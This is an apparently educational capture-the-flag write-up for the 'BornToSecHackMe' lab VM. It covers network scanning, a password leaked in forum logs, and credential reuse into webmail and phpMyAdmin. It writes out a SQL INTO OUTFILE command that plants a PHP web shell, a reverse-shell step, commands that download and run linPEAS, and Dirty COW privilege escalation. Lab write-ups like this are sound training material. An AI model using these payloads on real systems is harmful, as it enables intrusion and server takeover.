## Foothold
We know it's a server but we don't have it's IP. Let's do a ping Sweep.

First, I have to know my network IP, so let's do an `ifconfig` on my own laptop
![[Images/Capture d’écran 2024-07-23 à 17.13.06.png]]

My ip is 192.168.1.27 so let's ping sweep the 192.168.1.* network with `nmap -sn '192.168.1.*'`
Among all the responses, we get
![[Images/Capture d’écran 2024-07-23 à 17.15.50.png]]

We now know the IP of the server, let's find its open ports with `rustscan -a 192.168.1.21`
![[Images/Capture d’écran 2024-07-23 à 17.17.15.png]]

We see the http and https ports are open. Let's see the website http version first and https second:
![[Images/Capture d’écran 2024-07-23 à 17.18.10.png]]
![[Images/Capture d’écran 2024-07-23 à 17.19.13.png]]
We can see all the directories in the site with `feroxbuster -w /opt/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "https://192.168.1.21" -k`
![[Images/Capture d’écran 2024-07-23 à 17.21.41.png]]

/webmail and /phpmyadmin both ask for a password but /forum allows us to see it as a guest
![[Images/Capture d’écran 2024-07-23 à 17.22.20.png]]

Most of those threads are no use but the "Probleme login ?" one seems more interesting
![[Images/Capture d’écran 2024-07-23 à 17.23.01.png]]

Among all those lines, we find this one:
`Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`

This seems like a mistake where the password was put in the username field. Let's try the password with every user (we can find the list by clicking on the link in the top right of the header)
![[Images/Capture d’écran 2024-07-23 à 17.26.10.png]]

We find that we can connect with the username lmezard and the password `!q\]Ej?*5K5cy*AJ`

On the profile page we can see that the email adress is laurie@borntosec.net
![[Images/Capture d’écran 2024-07-23 à 17.26.42.png]]

We can now try to connect to the webmail with this email adress and password. It works:
![[Images/Capture d’écran 2024-07-23 à 17.27.31.png]]

"Very interesting!!!" is just the description of a software called WinDev. DB Access however is more interesting:
![[Images/Capture d’écran 2024-07-23 à 17.29.22.png]]
> root/Fg-'kKXBj87E:aJ$

Let's try these credentials in /phpmyadmin. It works:
![[Images/Capture d’écran 2024-07-23 à 17.34.16.png]]

I now have access to userdata, including encrypted passwords. I can change the password of admin to the same than lmezard and connect to the forum with the same website
![[Images/Capture d’écran 2024-07-23 à 17.46.01.png]]

In phpmyadmin I can now use SQL to create a webshell with this command:
`select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '/var/www/forum/templates_c/evil.php'`
It will create a page in `https://[IP]/forum/templates_c/evil.php` that will get the c argument and execute it. For instance, with `?c=echo hello` we get:
![[Images/Capture d’écran 2024-07-24 à 17.47.50.png]]

We can now use a reverse shell generator to create a reverse shell and gain access to the target
![[Images/Capture d’écran 2024-07-25 à 14.11.18.png]]

I now run `pwncat-cs -lp 14242`
to wait for the connection and I paste the reverse shell in the c argument of the site. I now have a terminal in the server.
![[Images/Capture d’écran 2024-07-25 à 14.12.40.png]]

## Dirty Cow
From there, I can use linPEAS to check for potential security exploits:
`cd /tmp`
`curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh`
`chmod +x linpeas.sh`
`./linpeas.sh -a > linpeas.log`
`less -r linpeas.log`
![[Images/Capture d’écran 2024-07-25 à 14.22.22.png]]

We see that it's highly probable that the kernel exploit called dirty cow is not patched. Let's try it. First we download it with the linked given by linpeas and we upload it to the server (pwncat allows to do it easily, otherwise you could curl it).
`gcc 40839.c -lpthread -lcrypt`
![[Images/Capture d’écran 2024-07-25 à 14.25.52.png]]

We can now `su -` with the password we've given
![[Images/Capture d’écran 2024-07-25 à 14.26.57.png]]
